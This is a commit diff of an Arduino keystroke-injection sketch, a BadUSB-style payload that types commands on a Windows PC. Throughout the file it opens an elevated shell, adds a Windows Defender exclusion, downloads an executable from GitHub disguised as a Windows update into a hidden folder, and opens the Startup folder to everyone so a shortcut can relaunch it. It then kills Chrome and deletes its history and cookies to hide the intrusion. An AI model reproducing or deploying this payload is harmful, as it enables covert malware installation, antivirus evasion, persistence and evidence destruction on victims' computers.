abf97429d172213b7289deba0b3a54ede67a5909
smallmacy <55838866+smallmacy@users.noreply.github.com>
2020-04-10 19:16:23 +0300

    Add files via upload

--- payload_on_admin_desktop.ino
+++ payload_on_admin_desktop.ino
@@ -1,88 +1,74 @@
 #include "Keyboard.h"
 #define  MENU_KEY 0xED
-//
+
 void typeKey(uint8_t key)
 {
   Keyboard.press(key);
   delay(50);
   Keyboard.release(key);
 }
-//
-/* Init function */
+
 void setup()
 {
-  // Begining the Keyboard stream
+  // Start Keyboard and Mouse
   Keyboard.begin();
-//
-  // Wait 500ms
-  delay(500);
 
-  // ducky script for downloading a file from github and executing it as a process assuming that the user is an admin
-  // plus adding a shortcut which will run even if the user shuts down or restarts computer
+  // Start Payload
+  delay(500);
   Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
+  Keyboard.press(114);
   Keyboard.releaseAll();
+
 
   delay(200);
 
-  Keyboard.print(F("powershell  Start-Process cmd -Verb RunAs"));
+  Keyboard.print(F("cmd"));
 
-  typeKey(KEY_RETURN);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
 
-  delay(3500);
-
+  delay(1500);
+  
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press('y');
   Keyboard.releaseAll();
 
   delay(600);
 
-  Keyboard.print(F("cd \"%USERPROFILE%\\Desktop\""));
+  Keyboard.print(F("start"));
 
   typeKey(KEY_RETURN);
 
-  delay(100);
+  delay(300);
 
-  Keyboard.print(F("powershell"));
+  Keyboard.print(F("MKDIR \"%USERPROFILE%\\Desktop\\system\" & cd \"%USERPROFILE%\\Desktop\\system\" & attrib +s +h \"%USERPROFILE%\\Desktop\\system\" & powershell"));
 
   typeKey(KEY_RETURN);
 
   delay(400);
 
-  Keyboard.print(F("$wc=New-Object System.Net.Webclient"));
+  // The next line will exclude the path to system folder so it will not be checked by windows defender antivirus and hide the folder that was created
+
+  Keyboard.print(F("Add-MpPreference -ExclusionPath \"$env:USERPROFILE\\Desktop\\system\";$wc=New-Object System.Net.Webclient; $wc.DownloadFile(\"https://github.com/smallmacy/Cyber_Project/raw/master/final.exe\", \"windows_update_backup.exe\"); Remove-MpPreference -ExclusionPath \"$env:USERPROFILE\\Desktop\\system\""));  
+
 
   typeKey(KEY_RETURN);
 
   delay(100);
 
-  Keyboard.print(F("$wc.DownloadFile(\"https://github.com/smallmacy/Cyber_Project/raw/master/final.exe\",\"windows_update.exe\")"));
+  // switch to other cmd tab
 
-  typeKey(KEY_RETURN);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
 
-  delay(10000);
-
-  Keyboard.print(F("exit"));
-
-  typeKey(KEY_RETURN);
-  
-  
-
-  delay(400);
-  Keyboard.print(F("Icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\" /grant Everyone:(OI)(CI)F /T"));
-
-  typeKey(KEY_RETURN);
-  delay(150);
-
+  delay(200);
 
   // This will allow everyone full acess over Startup directory, which is nessecary to run the shortcut
-  // Script for shortcut:
-  Keyboard.print(F("cd \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\""));
 
-  typeKey(KEY_RETURN);
-
-  delay(100);
-
-  Keyboard.print(F("start ."));
+  Keyboard.print(F("Icacls \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" /grant Everyone:(OI)(CI)F /T & cd \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" & start ."));
 
   typeKey(KEY_RETURN);
 
@@ -91,15 +77,18 @@ void setup()
   Keyboard.press(MENU_KEY);
 
   Keyboard.releaseAll();
-
-  Keyboard.print(F("w"));
   
+  Keyboard.print(F("w"));
   
   Keyboard.print(F("s"));
 
   typeKey(KEY_RETURN);
+
   delay(1500);
-  Keyboard.print(F("C:\\Windows\\System32\\cmd.exe /min /c \"set __COMPAT_LAYER=RUNASINVOKER && start \"\" %USERPROFILE%\\Desktop\\windows_update.exe\""));
+
+  // Script for shortcut:
+
+  Keyboard.print(F("C:\\Windows\\System32\\cmd.exe /min /c \"set __COMPAT_LAYER=RUNASINVOKER && start \"\" %USERPROFILE%\\Desktop\\system\\windows_update_backup.exe\""));
 
   typeKey(KEY_RETURN);
 
@@ -112,39 +101,122 @@ void setup()
   delay(900);
 
   Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press('w');
+  Keyboard.press(119);
   Keyboard.releaseAll();
+
+  delay(300);
+
+  // Steps to restore chrome if it was up or just delete the history file if it isn't:
+
+  // Check if chrome is running by the lines until the if statement:
+
+  Keyboard.print(F("FOR /F \"tokens=* USEBACKQ\" %g IN (`tasklist /FI \"STATUS eq RUNNING\" /FI \"IMAGENAME eq chrome.exe\"`) DO (SET condition=%g)"));
+
+  typeKey(KEY_RETURN);
+
+  delay(300);
+
+  Keyboard.print(F("IF NOT \"%condition%\" == \"INFO: No tasks are running which match the specified criteria.\" (start chrome)"));
+
+  // Either open chrome and delete the cookies so webtop user will be logged out, or do nothing if chrome isn't running
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_DELETE);
+  Keyboard.releaseAll();
+
+  delay(800);
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(119);
+  Keyboard.releaseAll();
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+
+  delay(300);
+
+  // Deleting the other cmd after removing the exclusion from windows defender
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  Keyboard.print(F("c"));
+
+  delay(300);
+
+  // Delete chrome windows if exists and the history file and starting the shortcut
+
+  Keyboard.print(F("TSKILL chrome "/* ADD & start test.lnk*/);
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  Keyboard.print(F("DEL \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History\" & DEL \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 1\\History\""));
+
+  typeKey(KEY_RETURN);
+
+  delay(250);
+
+  // Either go to chrome to restore tabs, or open another cmd window. Both ways close all suspicious windows
+
+  Keyboard.print(F("IF NOT \"%condition%\" == \"INFO: No tasks are running which match the specified criteria.\" (start chrome & exit) else (start)"));
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(116);
+  Keyboard.releaseAll();
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+
   delay(300);
 
   Keyboard.print(F("exit"));
-  typeKey(KEY_RETURN);
-  delay(200);
-  
-  // Kills chrome
-  Keyboard.print(F("TSKILL chrome"));
-  typeKey(KEY_RETURN);
-  delay(100);
-  //Keyboard.print(F("exit"));
-  //typeKey(KEY_RETURN);
-  //delay(200);
 
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('x');
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(' ');
   Keyboard.releaseAll();
 
   delay(100);
-  
-  Keyboard.print(F("u"));
 
-  delay(100);
+  Keyboard.print(F("c"));
 
-  //Keyboard.print(F("u"));
+  // End Payload
 
-  // the program is running as a process!
-
-  // Ending stream
+  // Stop Keyboard and Mouse
   Keyboard.end();
 }
 
-/* Unused endless loop */
+// Unused
 void loop() {}
